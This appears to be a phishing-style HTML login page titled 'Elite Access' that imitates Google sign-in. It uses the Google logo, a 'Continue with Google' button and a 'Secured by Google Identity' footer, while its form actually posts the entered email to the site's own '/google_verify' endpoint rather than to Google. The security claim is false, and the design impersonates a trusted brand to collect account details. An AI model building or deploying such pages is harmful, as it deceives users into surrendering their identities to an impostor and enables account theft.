<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#050505] h-screen flex items-center justify-center p-6">
    <div class="w-full max-w-sm bg-[#0a0a0a] border border-white/5 p-10 rounded-3xl shadow-2xl text-center">
        <div class="mb-6 flex justify-center">
            <svg class="w-12 h-12" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24s.92 7.54 2.56 10.78l7.97-6.19z"></path>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
            </svg>
        </div>

        <h2 class="text-2xl font-black text-white mb-2 uppercase tracking-tight">Elite Access</h2>
        <p class="text-xs text-gray-500 mb-10">Sign in with your Google account to continue.</p>
        
        <form action="/google_verify" method="POST">
            <input type="email" name="user_email" placeholder="yourname@gmail.com" required
                   class="w-full bg-white/5 border border-white/10 p-4 rounded-xl text-white mb-4 focus:outline-none focus:border-blue-500 text-center">
            
            <button type="submit" class="w-full bg-white text-black py-4 rounded-xl font-bold flex items-center justify-center gap-3 hover:bg-gray-200 transition-all">
                Continue with Google
            </button>
        </form>

        <p class="mt-8 text-[10px] text-gray-600 uppercase tracking-widest">Secured by Google Identity</p>
    </div>
</body>
</html>
